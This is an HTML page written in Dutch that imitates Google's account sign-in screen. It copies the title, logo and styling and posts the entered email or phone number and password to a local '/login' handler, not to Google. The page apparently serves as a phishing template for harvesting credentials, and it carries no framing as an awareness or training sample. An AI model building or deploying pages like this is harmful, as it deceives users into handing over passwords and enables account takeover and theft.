<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inloggen - Google-accounts</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        @media (max-width: 450px) { .login-box { border: none; padding: 20px; } }
        
        /* Logo styling */
        .logo-container { height: 30px; margin-bottom: 10px; display: flex; justify-content: center; align-items: center; }
        .google-logo { height: 24px; }
        .fallback-logo { font-size: 24px; font-weight: 500; }
        .g-blue { color: #4285F4; } .g-red { color: #EA4335; } .g-yellow { color: #FBBC05; } .g-green { color: #34A853; }

        h1 { font-size: 24px; font-weight: 400; margin: 10px 0 8px 0; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
        .blue-text { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; }
        .button-container { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" 
                 class="google-logo" 
                 alt="Google" 
                 onerror="this.style.display='none'; document.getElementById('fallback').style.display='block';">
            
            <div id="fallback" class="fallback-logo" style="display:none;">
                <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
            </div>
        </div>

        <h1>Inloggen</h1>
        <p>Gebruik je Google-account</p>
        
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="E-mailadres of telefoonnummer" required>
            <input type="password" name="password" placeholder="Wachtwoord opgeven" required>
            
            <div style="text-align: left; margin-top: 5px;">
                <a class="blue-text">Wachtwoord vergeten?</a>
            </div>
            
            <div class="button-container">
                <a class="blue-text">Account maken</a>
                <button type="submit">Volgende</button>
            </div>
        </form>
    </div>
</body>
</html>
